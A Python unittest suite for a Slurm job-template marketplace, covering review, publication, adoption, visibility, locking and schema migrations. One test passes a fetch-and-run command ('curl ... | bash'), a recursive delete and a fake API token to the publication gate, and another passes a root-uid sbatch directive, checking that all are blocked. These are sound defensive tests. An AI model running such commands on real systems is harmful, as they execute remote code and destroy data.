import sqlite3
import tempfile
import unittest
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from unittest.mock import patch

from pilot107.core.contracts import ContractService, ContractStore, RecipeCatalog
from pilot107.core.schema_migrations import apply_schema_migrations
from pilot107.core.template_market import (
    TemplateDraftState,
    TemplateMarketError,
    TemplateMarketStore,
    TemplateReviewState,
    TemplateVisibility,
    _rebase_adopter_workdir,
)
from pilot107.core.template_market_migrations import TEMPLATE_MARKET_MIGRATIONS
from pilot107.core.template_policy import (
    TemplatePublicationGate,
    TemplateReviewerPrincipal,
    TemplateReviewerRole,
)


class TemplateMarketStoreTests(unittest.TestCase):
    def setUp(self) -> None:
        self._temporary = tempfile.TemporaryDirectory()
        self.db_path = Path(self._temporary.name) / "pilot107.db"
        self.contract_service = ContractService(
            catalog=RecipeCatalog(),
            store=ContractStore(self.db_path),
        )
        self.gate = TemplatePublicationGate(self.contract_service)
        self.store = TemplateMarketStore(
            self.db_path,
            publication_gate=self.gate,
            contract_service=self.contract_service,
        )

    def tearDown(self) -> None:
        self._temporary.cleanup()

    def test_review_publish_and_adopt_preserve_advanced_payload(self) -> None:
        draft = self._draft(visibility=TemplateVisibility.CAMPUS)
        review = self.store.submit_review(
            draft.draft_id,
            owner="alice",
            expected_version=1,
            review_id="review_publish",
        )
        decided = self.store.decide_review(
            review.review_id,
            principal=self._reviewer(),
            expected_version=1,
            approve=True,
            note="verified",
        )
        release = self.store.publish(
            review.review_id,
            owner="alice",
            release_version="1.0.0",
            release_id="release_publish",
        )
        adoption = self.store.adopt_release(
            release.release_id,
            adopter="bob",
            request_key="adopt-course-template",
        )
        adopted = self.store.get_draft(adoption.target_draft_id, owner="bob")
        self.assertIsNotNone(adoption.target_contract_id)
        contract = self.contract_service.get(str(adoption.target_contract_id))

        self.assertEqual(decided.state, TemplateReviewState.APPROVED)
        self.assertEqual(release.content_sha256, review.content_sha256)
        self.assertEqual(adopted.visibility, TemplateVisibility.PRIVATE)
        self.assertEqual(adopted.state, TemplateDraftState.EDITABLE)
        self.assertEqual(adopted.payload["project"]["workdir"], "/public/home/bob")
        self.assertEqual(draft.payload["project"]["workdir"], "/public/home/alice")
        self.assertEqual(
            adopted.payload["extensions"]["advanced"]["raw_sbatch"],
            "#SBATCH --exclusive",
        )
        self.assertEqual(adopted.publication, draft.publication)
        self.assertNotEqual(adopted.template_id, release.template_id)
        self.assertEqual(contract.owner, "bob")
        self.assertEqual(contract.derivation_reason, "template_adoption")
        self.assertEqual(
            contract.field_sources[0]["source_release_id"],
            release.release_id,
        )
        self.assertEqual(contract.payload["entry"], release.payload["entry"])
        self.assertEqual(contract.payload["resources"], release.payload["resources"])
        self.assertEqual(contract.payload["project"]["workdir"], "/public/home/bob")
        self.assertTrue(contract.field_sources[0]["adopter_workdir_rebased"])

    def test_adoption_rebases_any_foreign_personal_home(self) -> None:
        payload = self._contract()
        payload["project"]["workdir"] = "/public/home/bob/course/output"

        rebased = _rebase_adopter_workdir(payload, adopter="alice")

        self.assertEqual(rebased["project"]["workdir"], "/public/home/alice/course/output")
        self.assertEqual(payload["project"]["workdir"], "/public/home/bob/course/output")

    def test_publish_rechecks_current_publication_policy(self) -> None:
        draft = self._draft(visibility=TemplateVisibility.PUBLIC)
        with patch.object(self.gate, "validate", wraps=self.gate.validate) as validate:
            review = self.store.submit_review(
                draft.draft_id,
                owner="alice",
                expected_version=1,
            )
            self.store.decide_review(
                review.review_id,
                principal=self._reviewer(),
                expected_version=1,
                approve=True,
            )
            self.store.publish(
                review.review_id,
                owner="alice",
                release_version="1.0.0",
            )

        self.assertEqual(validate.call_count, 2)
        self.assertEqual(review.gate_report["policy_version"], "template-publication/v1")

    def test_policy_migration_upgrades_existing_template_market_schema(self) -> None:
        legacy_db = Path(self._temporary.name) / "legacy-market.db"
        with sqlite3.connect(legacy_db) as conn:
            apply_schema_migrations(conn, TEMPLATE_MARKET_MIGRATIONS[:-1])

        TemplateMarketStore(legacy_db)

        with sqlite3.connect(legacy_db) as conn:
            draft_columns = {
                str(row[1]) for row in conn.execute("PRAGMA table_info(template_drafts)")
            }
            release_columns = {
                str(row[1]) for row in conn.execute("PRAGMA table_info(template_releases)")
            }
            adoption_columns = {
                str(row[1]) for row in conn.execute("PRAGMA table_info(template_adoptions)")
            }
            verification_columns = {
                str(row[1]) for row in conn.execute("PRAGMA table_info(template_verifications)")
            }
            history = conn.execute(
                "SELECT migration_id FROM schema_migrations WHERE migration_id = ?",
                ("003c.004.template_market_vertical",),
            ).fetchone()

        self.assertIn("publication_json", draft_columns)
        self.assertIn("gate_report_json", release_columns)
        self.assertIn("request_key", release_columns)
        self.assertIn("target_contract_id", adoption_columns)
        self.assertIn("evidence_sha256", verification_columns)
        self.assertIn("detail_json", verification_columns)
        self.assertEqual(history, ("003c.004.template_market_vertical",))

    def test_adoption_rolls_back_draft_and_contract_together(self) -> None:
        release_id = self._published_release(visibility=TemplateVisibility.PUBLIC)
        with self.store.connect() as conn:
            conn.execute(
                "CREATE TRIGGER reject_adoption_contract BEFORE INSERT ON contracts "
                "BEGIN SELECT RAISE(ABORT, 'injected contract failure'); END"
            )

        with self.assertRaises(sqlite3.IntegrityError):
            self.store.adopt_release(
                release_id,
                adopter="bob",
                request_key="atomic-adoption",
            )

        with self.store.connect() as conn:
            draft_count = conn.execute(
                "SELECT COUNT(*) FROM template_drafts WHERE owner = 'bob'"
            ).fetchone()[0]
            adoption_count = conn.execute(
                "SELECT COUNT(*) FROM template_adoptions WHERE adopter = 'bob'"
            ).fetchone()[0]
            contract_count = conn.execute(
                "SELECT COUNT(*) FROM contracts WHERE owner = 'bob'"
            ).fetchone()[0]
        self.assertEqual((draft_count, adoption_count, contract_count), (0, 0, 0))

    def test_market_visibility_filters_metrics_ranking_and_cursor(self) -> None:
        public_release = self._published_release(visibility=TemplateVisibility.PUBLIC)
        campus_release = self._published_release(visibility=TemplateVisibility.CAMPUS)
        course_release = self._published_release(
            visibility=TemplateVisibility.COURSE,
            scope_key="course-107",
        )
        private_release = self._published_release(visibility=TemplateVisibility.PRIVATE)
        self.store.adopt_release(
            public_release,
            adopter="bob",
            request_key="market-adoption",
        )
        self.store.create_verification(
            release_id=campus_release,
            run_id="run_market",
            environment="docker",
            status="passed",
            evidence_ref="evidence://runs/run_market/manifest/manifest.json",
            evidence_sha256="a" * 64,
            verified_by="bob",
            request_key="market-verification",
            detail={},
        )

        first, cursor = self.store.list_market_page(
            actor="bob",
            course_scopes=frozenset({"course-107"}),
            limit=1,
        )
        self.assertEqual(first[0].release.release_id, campus_release)
        self.assertEqual(first[0].metrics.verification_passed, 1)
        self.assertIsNotNone(cursor)
        remainder, _ = self.store.list_market_page(
            actor="bob",
            course_scopes=frozenset({"course-107"}),
            cursor=cursor,
            limit=10,
        )
        visible = {first[0].release.release_id, *(item.release.release_id for item in remainder)}
        self.assertEqual(visible, {public_release, campus_release, course_release})
        self.assertNotIn(private_release, visible)

        verified, _ = self.store.list_market_page(actor="bob", verified_only=True)
        self.assertEqual([item.release.release_id for item in verified], [campus_release])
        cpu, _ = self.store.list_market_page(actor="bob", gpu=False, partition="debug")
        self.assertEqual(
            {item.release.release_id for item in cpu},
            {public_release, campus_release},
        )

    def test_optimistic_lock_and_review_lock_prevent_mutation(self) -> None:
        draft = self._draft()
        updated = self.store.update_draft(
            draft.draft_id,
            owner="alice",
            expected_version=1,
            title="Updated",
            description="changed",
            visibility=TemplateVisibility.PRIVATE,
            payload=draft.payload,
            compatibility=draft.compatibility,
            publication=draft.publication,
        )
        with self.assertRaises(TemplateMarketError) as stale:
            self.store.update_draft(
                draft.draft_id,
                owner="alice",
                expected_version=1,
                title="Stale",
                description="stale",
                visibility=TemplateVisibility.PRIVATE,
                payload=draft.payload,
                compatibility=draft.compatibility,
                publication=draft.publication,
            )
        self.assertEqual(stale.exception.code, "TEMPLATE.DRAFT_CONFLICT")

        self.store.submit_review(updated.draft_id, owner="alice", expected_version=2)
        with self.assertRaises(TemplateMarketError) as locked:
            self.store.update_draft(
                draft.draft_id,
                owner="alice",
                expected_version=2,
                title="Locked",
                description="locked",
                visibility=TemplateVisibility.PRIVATE,
                payload=draft.payload,
                compatibility=draft.compatibility,
                publication=draft.publication,
            )
        self.assertEqual(locked.exception.code, "TEMPLATE.DRAFT_CONFLICT")

    def test_release_rows_are_database_immutable(self) -> None:
        release_id = self._published_release(visibility=TemplateVisibility.PUBLIC)

        with self.assertRaises(sqlite3.IntegrityError), self.store.connect() as conn:
            conn.execute(
                "UPDATE template_releases SET title = 'tampered' WHERE release_id = ?",
                (release_id,),
            )
        with self.assertRaises(sqlite3.IntegrityError), self.store.connect() as conn:
            conn.execute(
                "DELETE FROM template_releases WHERE release_id = ?",
                (release_id,),
            )

    def test_adoption_visibility_withdrawal_and_idempotency(self) -> None:
        course_release = self._published_release(
            visibility=TemplateVisibility.COURSE,
            scope_key="course-107",
        )
        with self.assertRaises(TemplateMarketError) as forbidden:
            self.store.adopt_release(
                course_release,
                adopter="bob",
                request_key="course-denied",
            )
        self.assertEqual(forbidden.exception.code, "TEMPLATE.FORBIDDEN")

        first = self.store.adopt_release(
            course_release,
            adopter="bob",
            request_key="course-allowed",
            course_scopes=frozenset({"course-107"}),
        )
        repeated = self.store.adopt_release(
            course_release,
            adopter="bob",
            request_key="course-allowed",
            course_scopes=frozenset({"course-107"}),
        )
        self.assertEqual(first, repeated)

        self.store.withdraw_release(course_release, actor="alice", reason="unsafe")
        with self.assertRaises(TemplateMarketError) as withdrawn:
            self.store.adopt_release(
                course_release,
                adopter="carol",
                request_key="after-withdrawal",
                course_scopes=frozenset({"course-107"}),
            )
        self.assertEqual(withdrawn.exception.code, "TEMPLATE.RELEASE_WITHDRAWN")

    def test_concurrent_adoption_retries_return_one_lineage(self) -> None:
        release_id = self._published_release(visibility=TemplateVisibility.PUBLIC)

        def adopt():
            return self.store.adopt_release(
                release_id,
                adopter="bob",
                request_key="concurrent-adoption",
            )

        with ThreadPoolExecutor(max_workers=2) as executor:
            first, second = executor.map(lambda _: adopt(), range(2))

        self.assertEqual(first.adoption_id, second.adoption_id)
        self.assertEqual(first.target_contract_id, second.target_contract_id)
        with self.store.connect() as conn:
            adoption_count = conn.execute(
                "SELECT COUNT(*) FROM template_adoptions WHERE adopter = 'bob'"
            ).fetchone()[0]
            contract_count = conn.execute(
                "SELECT COUNT(*) FROM contracts WHERE owner = 'bob'"
            ).fetchone()[0]
        self.assertEqual((adoption_count, contract_count), (1, 1))

    def test_rejected_draft_can_be_revised_and_resubmitted(self) -> None:
        draft = self._draft()
        review = self.store.submit_review(draft.draft_id, owner="alice", expected_version=1)
        rejected = self.store.decide_review(
            review.review_id,
            principal=self._reviewer(),
            expected_version=1,
            approve=False,
            note="fix resource declaration",
        )
        revised = self.store.update_draft(
            draft.draft_id,
            owner="alice",
            expected_version=1,
            title=draft.title,
            description="fixed",
            visibility=draft.visibility,
            payload=draft.payload,
            compatibility=draft.compatibility,
            publication=draft.publication,
        )
        next_review = self.store.submit_review(
            draft.draft_id,
            owner="alice",
            expected_version=2,
        )

        self.assertEqual(rejected.state, TemplateReviewState.REJECTED)
        self.assertEqual(revised.state, TemplateDraftState.EDITABLE)
        self.assertEqual(next_review.draft_version, 2)

    def test_review_authorization_prevents_self_review_and_cross_course_review(self) -> None:
        draft = self._draft(
            visibility=TemplateVisibility.COURSE,
            scope_key="course-107",
        )
        review = self.store.submit_review(
            draft.draft_id,
            owner="alice",
            expected_version=1,
        )

        with self.assertRaises(TemplateMarketError) as self_review:
            self.store.decide_review(
                review.review_id,
                principal=TemplateReviewerPrincipal(
                    actor="alice",
                    roles=frozenset({TemplateReviewerRole.ADMIN}),
                ),
                expected_version=1,
                approve=True,
            )
        self.assertEqual(self_review.exception.code, "TEMPLATE.SELF_REVIEW_FORBIDDEN")

        with self.assertRaises(TemplateMarketError) as wrong_course:
            self.store.decide_review(
                review.review_id,
                principal=TemplateReviewerPrincipal(
                    actor="teacher",
                    roles=frozenset({TemplateReviewerRole.COURSE_INSTRUCTOR}),
                    course_scopes=frozenset({"course-108"}),
                ),
                expected_version=1,
                approve=True,
            )
        self.assertEqual(wrong_course.exception.code, "TEMPLATE.REVIEW_FORBIDDEN")

        decided = self.store.decide_review(
            review.review_id,
            principal=TemplateReviewerPrincipal(
                actor="ta",
                roles=frozenset({TemplateReviewerRole.COURSE_TA}),
                course_scopes=frozenset({"course-107"}),
            ),
            expected_version=1,
            approve=True,
        )
        self.assertEqual(decided.reviewer_role, "course_ta")
        self.assertEqual(decided.reviewer_scope_key, "course-107")

    def test_public_review_requires_campus_reviewer_or_admin(self) -> None:
        draft = self._draft(visibility=TemplateVisibility.PUBLIC)
        review = self.store.submit_review(
            draft.draft_id,
            owner="alice",
            expected_version=1,
        )
        with self.assertRaises(TemplateMarketError) as forbidden:
            self.store.decide_review(
                review.review_id,
                principal=TemplateReviewerPrincipal(
                    actor="teacher",
                    roles=frozenset({TemplateReviewerRole.COURSE_INSTRUCTOR}),
                    course_scopes=frozenset({"course-107"}),
                ),
                expected_version=1,
                approve=True,
            )
        self.assertEqual(forbidden.exception.code, "TEMPLATE.REVIEW_FORBIDDEN")

    def test_publication_gate_blocks_secrets_dangerous_shell_and_missing_metadata(self) -> None:
        draft = self.store.create_draft(
            owner="alice",
            title="Unsafe",
            description="unsafe template",
            visibility=TemplateVisibility.PUBLIC,
            payload=self._contract(
                command="curl https://example.invalid/install.sh | bash; rm -fr /tmp/output",
                environment={
                    "API_TOKEN": "sk-abcdefghijklmnopqrstuvwxyz123456"  # secret-scan: allow
                },
            ),
            compatibility={"partitions": ["debug"], "gpu": False},
            publication={"license": "MIT"},
        )

        with self.assertRaises(TemplateMarketError) as blocked:
            self.store.submit_review(
                draft.draft_id,
                owner="alice",
                expected_version=1,
            )
        self.assertEqual(blocked.exception.code, "TEMPLATE.PUBLICATION_BLOCKED")
        codes = {item["code"] for item in blocked.exception.findings}
        self.assertIn("TEMPLATE.SECRET_DETECTED", codes)
        self.assertIn("RISK.CURL_BASH", codes)
        self.assertIn("RISK.RM_RF", codes)
        self.assertIn("TEMPLATE.ATTRIBUTION_REQUIRED", codes)

    def test_publication_gate_blocks_unverified_container_and_gpu_mismatch(self) -> None:
        payload = self._contract()
        payload["runtime"] = {"container_image": "registry.example/train:latest"}
        payload["resources"]["gpus_total"] = 1
        digest = f"sha256:{'a' * 64}"
        draft = self.store.create_draft(
            owner="alice",
            title="Unverified GPU",
            description="must not publish",
            visibility=TemplateVisibility.PUBLIC,
            payload=payload,
            compatibility={
                "partitions": ["debug"],
                "gpu": False,
                "container": {"verified": True, "image_digest": digest},
            },
            publication=self._publication(),
        )

        with self.assertRaises(TemplateMarketError) as blocked:
            self.store.submit_review(
                draft.draft_id,
                owner="alice",
                expected_version=1,
            )
        codes = {item["code"] for item in blocked.exception.findings}
        self.assertIn("TEMPLATE.COMPATIBILITY_GPU", codes)
        self.assertIn("TEMPLATE.CONTAINER_UNVERIFIED", codes)

    def test_trusted_container_digest_still_requires_materializer_capability(self) -> None:
        digest = f"sha256:{'b' * 64}"
        payload = self._contract()
        payload["runtime"] = {
            "container_image": f"registry.example/train@{digest}",
        }
        gate = TemplatePublicationGate(
            self.contract_service,
            verified_container_digests=frozenset({digest}),
        )

        result = gate.validate(
            payload=payload,
            compatibility={
                "partitions": ["debug"],
                "gpu": False,
                "container": {"image_digest": digest},
            },
            publication=self._publication(),
        )

        codes = {finding.code for finding in result.findings}
        self.assertEqual(result.status, "BLOCK")
        self.assertNotIn("TEMPLATE.CONTAINER_UNVERIFIED", codes)
        self.assertIn("MATERIALIZER.CONTAINER_CAPABILITY_REQUIRED", codes)

    def test_publication_gate_rejects_unsupported_raw_sbatch_directive(self) -> None:
        payload = self._contract()
        payload["extensions"] = {
            "advanced": {"raw_sbatch": "#SBATCH --uid=0\n#SBATCH --exclusive=true"}
        }
        draft = self.store.create_draft(
            owner="alice",
            title="Unsafe directive",
            description="must not publish",
            visibility=TemplateVisibility.PUBLIC,
            payload=payload,
            compatibility={"partitions": ["debug"], "gpu": False},
            publication=self._publication(),
        )

        with self.assertRaises(TemplateMarketError) as blocked:
            self.store.submit_review(
                draft.draft_id,
                owner="alice",
                expected_version=1,
            )
        codes = {item["code"] for item in blocked.exception.findings}
        self.assertIn("TEMPLATE.RAW_SBATCH_UNSUPPORTED", codes)
        self.assertIn("TEMPLATE.RAW_SBATCH_UNSAFE", codes)

    def _draft(
        self,
        *,
        visibility: TemplateVisibility = TemplateVisibility.PRIVATE,
        scope_key: str | None = None,
    ):
        return self.store.create_draft(
            owner="alice",
            title="PyTorch assignment",
            description="Course assignment template",
            visibility=visibility,
            scope_key=scope_key,
            payload={
                "recipe_version_id": "recipe_python_cpu@1.0.0",
                "project": {"workdir": "/public/home/alice"},
                "entry": {"command": "python train.py"},
                "resources": {
                    "partition": "debug",
                    "qos": "normal",
                    "nodes": 1,
                    "ntasks": 1,
                    "cpus_per_task": 1,
                    "time_limit": "00:05:00",
                },
                "extensions": {"advanced": {"raw_sbatch": "#SBATCH --exclusive"}},
            },
            compatibility={"partitions": ["debug"], "gpu": False},
            publication=self._publication(),
        )

    def _published_release(
        self,
        *,
        visibility: TemplateVisibility,
        scope_key: str | None = None,
    ) -> str:
        draft = self._draft(visibility=visibility, scope_key=scope_key)
        review = self.store.submit_review(draft.draft_id, owner="alice", expected_version=1)
        self.store.decide_review(
            review.review_id,
            principal=self._reviewer(
                course_scope=scope_key if visibility == TemplateVisibility.COURSE else None
            ),
            expected_version=1,
            approve=True,
        )
        return self.store.publish(
            review.review_id,
            owner="alice",
            release_version="1.0.0",
        ).release_id

    def _reviewer(self, *, course_scope: str | None = None) -> TemplateReviewerPrincipal:
        if course_scope is not None:
            return TemplateReviewerPrincipal(
                actor="teacher",
                roles=frozenset({TemplateReviewerRole.COURSE_INSTRUCTOR}),
                course_scopes=frozenset({course_scope}),
            )
        return TemplateReviewerPrincipal(
            actor="reviewer",
            roles=frozenset({TemplateReviewerRole.REVIEWER}),
        )

    def _publication(self) -> dict[str, str]:
        return {
            "license": "MIT",
            "attribution": "Original work by alice",
            "dataset_access": "No external dataset is required",
            "risk_statement": "Runs only in the selected Slurm allocation",
        }

    def _contract(
        self,
        *,
        command: str = "echo ok",
        environment: dict[str, str] | None = None,
    ) -> dict:
        return {
            "recipe_version_id": "recipe_python_cpu@1.0.0",
            "project": {"workdir": "/public/home/alice"},
            "entry": {"command": command},
            "runtime": {"environment": environment or {}},
            "resources": {
                "partition": "debug",
                "qos": "normal",
                "nodes": 1,
                "ntasks": 1,
                "cpus_per_task": 1,
                "time_limit": "00:05:00",
            },
        }


if __name__ == "__main__":
    unittest.main()
